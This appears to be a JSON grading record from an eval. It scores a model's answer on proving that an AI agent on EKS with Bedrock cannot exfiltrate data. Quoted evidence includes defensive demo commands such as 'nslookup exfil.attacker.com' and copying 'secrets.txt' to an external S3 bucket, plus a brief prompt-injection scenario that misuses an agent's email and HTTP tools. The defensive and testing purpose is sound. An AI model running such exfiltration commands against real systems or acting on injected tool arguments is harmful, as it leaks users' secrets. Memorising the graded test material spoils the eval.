@@ -1,0 +1,130 @@
+{
+  "eval_id": 1,
+  "eval_name": "prove-agent-cannot-exfiltrate",
+  "configuration": "without_skill",
+  "expectations": [
+    {
+      "text": "Recommends default-deny egress with no general internet route from workload subnets",
+      "passed": true,
+      "evidence": "Exfil path row 1: 'Default-deny egress `NetworkPolicy` on the namespace; agent nodegroup in private subnets with **no NAT gateway** and no IGW route | NetworkPolicy YAML + route table showing no `0.0.0.0/0`'. The opening claim reinforces it: 'The pod has exactly one route off the node, and it terminates inside our VPC at a Bedrock endpoint.'"
+    },
+    {
+      "text": "Names VPC interface endpoints / PrivateLink for Bedrock so model traffic never traverses the internet",
+      "passed": true,
+      "evidence": "Row 2: 'VPC **interface endpoint** for `com.amazonaws.<region>.bedrock-runtime` (+ `bedrock-agent-runtime` if used); SG on the endpoint allows only the agent SG | Terraform for the endpoint; `dig` from the pod resolving to a private IP'."
+    },
+    {
+      "text": "Recommends Kubernetes NetworkPolicies (default-deny, named allowed flows) for east-west and egress control",
+      "passed": true,
+      "evidence": "Row 1 names default-deny egress NetworkPolicy on the namespace; row 5 names the allowed flow explicitly ('Egress policy allows UDP/TCP 53 **only to kube-dns**'); row 6 closes the hostNetwork bypass via Pod Security Admission + Kyverno/OPA — which is a control the with_skill run omitted. Note: east-west (agent→agent) is not explicitly discussed, but default-deny plus named flows is the substance of the assertion and it is clearly present."
+    },
+    {
+      "text": "Identifies DNS as an exfiltration channel that must also be restricted/logged",
+      "passed": true,
+      "evidence": "Row 5: 'Data leaks via DNS (the one they'll test you on) | Egress policy allows UDP/TCP 53 **only to kube-dns**; CoreDNS forwards to the VPC resolver only; no public resolver reachable | CoreDNS Corefile + NetworkPolicy'. The restriction is covered; DNS query LOGGING (e.g. Route 53 Resolver query logs) is not mentioned, but the assertion reads 'restricted/logged' as a disjunction."
+    },
+    {
+      "text": "Recommends S3 endpoint policy / aws:ResourceAccount condition to prevent writes to attacker-owned buckets",
+      "passed": true,
+      "evidence": "Row 4: 'Agent writes to an S3 bucket / DynamoDB table outside our account | Pod role (IRSA or EKS Pod Identity) scoped per-service; `aws:ResourceOrgID` condition on S3/Bedrock endpoint policies blocks any cross-org resource'. aws:ResourceOrgID is the org-scoped sibling of aws:ResourceAccount, applied on the endpoint policy — same mechanism, same threat closed. Passes on substance."
+    },
+    {
+      "text": "Recommends model-ARN allowlisting via IAM role and/or SCP and/or VPC endpoint policy (layered)",
+      "passed": true,
+      "evidence": "Row 3: 'IAM policy on the pod role scoped to explicit **model ARNs**, not `bedrock:*` / `Resource: \"*\"`; **VPC endpoint policy** re-asserting the same allowlist so it holds even if IAM drifts; SCP at the org level as backstop | The three policy documents, side by side'. All three layers named, with the layering rationale stated."
+    },
+    {
+      "text": "Names audit surfaces that are OFF BY DEFAULT and must be enabled (Bedrock model invocation logging and/or CloudTrail data events)",
+      "passed": false,
+      "evidence": "FAIL. Bedrock model invocation logging is named once, as an evidence artifact to hand over — 'plus Bedrock **model invocation logging** delivering prompts/completions to an S3 bucket with Object Lock (WORM) if you need tamper-evident retention' — but the answer nowhere states that it is OFF BY DEFAULT or that it must be explicitly enabled. It is presented as something you already have. CloudTrail is referenced only for management events ('`bedrock:InvokeModel` events with the pod's assumed-role identity'); CloudTrail DATA events are never mentioned. EKS control-plane audit logs (also off by default) are relied on implicitly ('a rejected-pod event in the audit log') without noting they must be turned on. The core discriminating content of this assertion — awareness that the agent-runtime audit trail does not exist until you enable it — is absent. Compare the with_skill run, which ships a Default column showing these surfaces as 'off'."
+    },
+    {
+      "text": "Offers a concrete demonstrable proof for the reviewer (e.g. exec into a pod and show an outbound curl / external DNS resolution being blocked)",
+      "passed": true,
+      "evidence": "'The demo that actually ends the meeting' — a runnable five-command block: 'kubectl exec -it deploy/agent -n agents -- sh; curl -m 5 https://example.com # hangs, then times out; nslookup exfil.attacker.com # SERVFAIL / no route; aws bedrock-runtime invoke-model --model-id <a model not on the allowlist> # AccessDeniedException; aws s3 cp secrets.txt s3://some-external-bucket # AccessDenied'. Strongest single artifact in the baseline answer, and it is graded as fully passing."
+    },
+    {
+      "text": "Frames the agent threat model: every reachable destination / tool call is a potential exfiltration channel",
+      "passed": true,
+      "evidence": "The answer is structured as an enumeration of ten exfil paths ('The egress paths, and what closes each one'), reframes the question structurally ('Nothing about the model's behavior is load-bearing ... If the agent decides to exfiltrate, the packet has nowhere to go'), and row 8 covers the tool-call channel directly: 'Prompt injection makes the agent call a *legitimate* tool with attacker-chosen args — `send_email(to=…)`, `http_get(url=…)` ... No tool takes a free-form destination.' It also closes with 'If your agent currently has a general-purpose HTTP tool, a shell tool, or an unscoped S3 write, fix that before the review.'"
+    }
+  ],
+  "summary": {
+    "passed": 8,
+    "failed": 1,
+    "total": 9,
+    "pass_rate": 0.89
+  },
+  "execution_metrics": {
+    "output_chars": 6094,
+    "total_tokens": 32376
+  },
+  "timing": {
+    "executor_duration_seconds": 82.0,
+    "total_duration_seconds": 82.0
+  },
+  "claims": [
+    {
+      "claim": "Cross-region inference profiles can silently route the request to another region; pin to a single-region model ID if residency is in scope",
+      "type": "factual",
+      "verified": true,
+      "evidence": "Correct and genuinely non-obvious — Bedrock cross-region inference (CRIS) profiles do route across regions within a geography. This is a real control the with_skill run did NOT surface for the AWS case (it raised the analogous point only in the Azure eval). Credit to the baseline here."
+    },
+    {
+      "claim": "hostNetwork can be used to bypass NetworkPolicy; close it with Pod Security Admission restricted + Kyverno/OPA",
+      "type": "factual",
+      "verified": true,
+      "evidence": "Correct — a hostNetwork pod shares the node network namespace and is not subject to pod NetworkPolicy. This bypass is a real gap that the with_skill run did not mention. A legitimate strength of the baseline."
+    },
+    {
+      "claim": "Bedrock doesn't retain inputs/outputs or use them to train base models, and inference is not sent to the model provider",
+      "type": "factual",
+      "verified": true,
+      "evidence": "Accurate statement of AWS's published Bedrock data-handling commitment, and the reviewer-facing framing ('Reviewers frequently believe \"calling Claude\" means \"sending data to Anthropic\"') is a real objection worth pre-empting."
+    },
+    {
+      "claim": "A Bedrock Guardrail can be enforced with an IAM condition so a call without the guardrail is denied",
+      "type": "factual",
+      "verified": true,
+      "evidence": "Correct — bedrock:GuardrailIdentifier is an IAM condition key, so an invoke without the guardrail can be denied. The framing ('That last part is what makes it a control rather than a suggestion') is exactly right, and the with_skill run reached the same invariant via an Organizations policy instead."
+    },
+    {
+      "claim": "VPC Flow Logs over the agent ENIs give continuous, not point-in-time, proof",
+      "type": "quality",
+      "verified": true,
+      "evidence": "Sound: 'a VPC Flow Logs query over the agent ENIs for the last 30 days, showing (a) ACCEPT only to the endpoint ENI, (b) the REJECT count, which should be near zero and explainable. This is your continuous proof, not a point-in-time one.' A strong evidence artifact the with_skill run did not propose."
+    },
+    {
+      "claim": "IAM Access Analyzer report showing no external access is the evidence artifact for cross-account writes",
+      "type": "process",
+      "verified": false,
+      "evidence": "Partially misleading. IAM Access Analyzer's external-access findings analyze resource policies on resources IN YOUR ACCOUNT for access granted TO outside principals. It does not demonstrate that your pod role cannot WRITE to a bucket in someone else's account — that is what the endpoint policy condition in the same row actually does. The control named is right; the evidence artifact named for it is the wrong tool."
+    }
+  ],
+  "user_notes_summary": {
+    "uncertainties": [],
+    "needs_review": [],
+    "workarounds": []
+  },
+  "eval_feedback": {
+    "suggestions": [
+      {
+        "assertion": "Names audit surfaces that are OFF BY DEFAULT and must be enabled (Bedrock model invocation logging and/or CloudTrail data events)",
+        "reason": "This is the ONE discriminating assertion across both evals (8 of 18 graded points separated the two configs by exactly this). It works because it tests default-state knowledge, not control-name recall. Build more assertions in this mold. Also: tighten the wording — 'names ... and/or Bedrock model invocation logging' is ambiguous between 'mentions the surface' and 'knows it is off by default'. I graded on the latter (the capitalized OFF BY DEFAULT), but a future grader could reasonably read it the other way and pass the baseline, collapsing the eval's only signal. Suggest: 'States explicitly that Bedrock model invocation logging and/or CloudTrail data events are OFF by default and must be explicitly enabled.'"
+      },
+      {
+        "reason": "Assertions 1-6, 8 and 9 are effectively non-discriminating: the unaided model produced default-deny egress, PrivateLink, NetworkPolicy, DNS restriction, endpoint-policy conditions, layered model-ARN allowlisting, a live kubectl demo, and a threat-model reframe — all unprompted. These are table stakes for a strong base model and should be treated as regression guards, not as evidence the skill is working."
+      },
+      {
+        "reason": "The baseline BEAT the with_skill run on three real controls that no assertion rewards: (1) hostNetwork as a NetworkPolicy bypass, closed via Pod Security Admission + Kyverno; (2) Bedrock cross-region inference profiles silently routing to another region; (3) enforcing the guardrail via a bedrock:GuardrailIdentifier IAM condition so an un-guardrailed call is DENIED. If the skill does not cover these, that is a content gap in the skill, not just the eval — the eval is currently blind to it."
+      },
+      {
+        "reason": "No assertion covers detection/alerting. The baseline produces a pile of evidence artifacts but never asks 'who gets paged when a policy layer changes'; the with_skill run has a dedicated alarm set ('An audit log nobody reads is decoration'). An assertion like 'Specifies alarms on the audit surfaces (e.g. invocation by a non-agent principal, out-of-allowlist model, endpoint-policy or NetworkPolicy modification)' would discriminate cleanly."
+      },
+      {
+        "reason": "No assertion penalizes an incorrect evidence artifact. The baseline cites 'IAM Access Analyzer report showing no external access' as proof the agent cannot write to an outside bucket — Access Analyzer does not prove that. A security reviewer would catch it. Consider an assertion that every named control is paired with an artifact that actually demonstrates that control."
+      }
+    ],
+    "overall": "Baseline 8/9 vs with_skill 9/9 — one discriminating assertion (off-by-default audit surfaces). The eval is well-aimed but the bar is set at a level a strong base model already clears. The signal that DID fire (default-state knowledge) is the template worth replicating; add assertions for alarms, log immutability semantics, Bedrock API key/SCP, and evidence-artifact correctness."
+  }
+}
